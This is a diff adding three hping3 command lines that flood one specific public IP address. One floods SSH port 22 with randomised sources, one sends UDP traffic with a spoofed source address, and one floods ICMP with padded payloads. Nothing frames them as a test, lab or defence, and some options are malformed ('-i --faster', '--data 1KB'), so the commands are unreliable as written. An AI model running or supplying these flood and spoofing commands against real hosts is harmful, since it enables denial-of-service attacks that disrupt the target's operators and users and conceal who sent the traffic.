@@ -1,0 +1,3 @@
+1/ hping3 138.197.149.203 -c 10000 -p 22 --rand-source
+2/ hping3 138.197.149.203 -c 9000 -i --faster --udp --spoof 146.23.05.07
+3/ hping3 138.197.149.203 -c 11000 -i u750 -1 --data 1KB
